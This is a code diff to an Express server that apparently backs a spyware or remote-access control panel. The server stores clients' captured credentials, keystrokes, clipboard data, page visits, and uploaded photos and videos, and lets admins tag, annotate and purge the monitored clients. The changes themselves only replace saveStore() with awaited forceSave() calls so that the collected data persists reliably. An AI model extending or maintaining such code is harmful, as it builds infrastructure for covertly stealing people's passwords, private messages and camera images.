@@ -533,7 +533,7 @@ app.post('/upload-media', (req, res) => {
         };
         store.media.unshift(entry);
         if (store.media.length > 500) store.media.length = 500;
-        saveStore();
+        await forceSave();
         addEvent('media', { clientId: cid, filename, size: entry.size });
         console.log(`\u{1F4F9} Video from ${cid}: ${filename} (${(entry.size/1024).toFixed(0)} KB)`);
         res.json({ success: true, id: entry.id });
@@ -605,7 +605,7 @@ app.post('/upload-photo', (req, res) => {
             store.clients[cid].lastPhotoTime = entry.timestamp;
         }
         addEvent('photo', { clientId: cid, filename, path: filePath });
-        saveStore();
+        await forceSave();
         console.log(`\u{1F4F7} Photo from ${cid}: ${filename}`);
         res.json({ success: true, id: entry.id, path: filePath });
     });
@@ -1339,20 +1339,20 @@ app.delete('/api/clear', requireAuth, async (req, res) => {
 app.get('/api/notes/:clientId', requireAuth, (req, res) => {
     res.json(store.notes?.[req.params.clientId] || []);
 });
-app.post('/api/notes/:clientId', requireAuth, (req, res) => {
+app.post('/api/notes/:clientId', requireAuth, async (req, res) => {
     if (!store.notes) store.notes = {};
     if (!store.notes[req.params.clientId]) store.notes[req.params.clientId] = [];
     const note = { id: Date.now().toString(36), text: (req.body.text || '').trim().slice(0, 2000), timestamp: new Date().toISOString() };
     if (!note.text) return res.status(400).json({ error: 'Empty note' });
     store.notes[req.params.clientId].unshift(note);
     if (store.notes[req.params.clientId].length > 100) store.notes[req.params.clientId].length = 100;
-    saveStore();
+    await forceSave();
     res.json({ success: true, note });
 });
-app.delete('/api/notes/:clientId/:noteId', requireAuth, (req, res) => {
+app.delete('/api/notes/:clientId/:noteId', requireAuth, async (req, res) => {
     if (store.notes?.[req.params.clientId]) {
         store.notes[req.params.clientId] = store.notes[req.params.clientId].filter(n => n.id !== req.params.noteId);
-        saveStore();
+        await forceSave();
     }
     res.json({ success: true });
 });
@@ -1361,10 +1361,10 @@ app.delete('/api/notes/:clientId/:noteId', requireAuth, (req, res) => {
 app.get('/api/tags', requireAuth, (req, res) => {
     res.json(store.tags || {});
 });
-app.post('/api/tags/:clientId', requireAuth, (req, res) => {
+app.post('/api/tags/:clientId', requireAuth, async (req, res) => {
     if (!store.tags) store.tags = {};
     store.tags[req.params.clientId] = { ...(store.tags[req.params.clientId] || {}), ...req.body, updatedAt: new Date().toISOString() };
-    saveStore();
+    await forceSave();
     io.to('admins').emit('tags_updated', store.tags);
     res.json({ success: true });
 });
@@ -1443,7 +1443,7 @@ app.delete('/api/client/:id', requireAuth, async (req, res) => {
     store.pageVisits   = store.pageVisits.filter(v => v.clientId !== id);
     store.credentials  = (store.credentials || []).filter(c => c.clientId !== id);
     store.events       = store.events.filter(e => e.data?.clientId !== id);
-    saveStore();
+    await forceSave();
     console.log(`\u{1F5D1}\u{FE0F}  Client ${id} deleted`);
     res.json({ success: true });
 });
@@ -1592,7 +1592,7 @@ app.post('/api/cleanup', requireAuth, async (req, res) => {
       else if (type === 'keystrokes') { store.keystrokes = []; }
       else if (type === 'clipboard') { store.clipboard = []; }
       else if (type === 'visits') { store.pageVisits = []; }
-    saveStore();
+    await forceSave();
     console.log(`\u{1F9F9} Cleanup: ${type}, ${deleted} removed`);
     res.json({ success: true, deleted });
 });
@@ -1623,7 +1623,7 @@ app.delete('/api/purge/:type', requireAuth, async (req, res) => {
         } catch {}
     }
     store[key] = [];
-    saveStore();
+    await forceSave();
     console.log(`\u{1F5D1}\u{FE0F}  Purged ${req.params.type}: ${deleted} entries`);
     res.json({ success: true, deleted });
 });
@@ -1664,7 +1664,7 @@ app.delete('/api/clients/bulk', requireAuth, async (req, res) => {
     store.credentials = (store.credentials || []).filter(c => !idSet.has(c.clientId));
     store.errors      = store.errors.filter(e => !idSet.has(e.clientId));
     store.events      = store.events.filter(e => !idSet.has(e.data?.clientId));
-    saveStore();
+    await forceSave();
 
     console.log(`\u{1F5D1}\u{FE0F}  Bulk deleted ${valid.length} clients`);
     res.json({ success: true, deleted: valid.length });
@@ -1715,7 +1715,7 @@ app.delete('/api/clients/stale', requireAuth, async (req, res) => {
         store.credentials  = (store.credentials || []).filter(c => !staleSet.has(c.clientId));
         store.errors       = store.errors.filter(e => !staleSet.has(e.clientId));
         store.events       = store.events.filter(e => !staleSet.has(e.data?.clientId));
-        saveStore();
+        await forceSave();
     }
 
     console.log(`\u{1F5D1}\u{FE0F}  Purged ${deleted} stale clients (>${days}d offline)`);
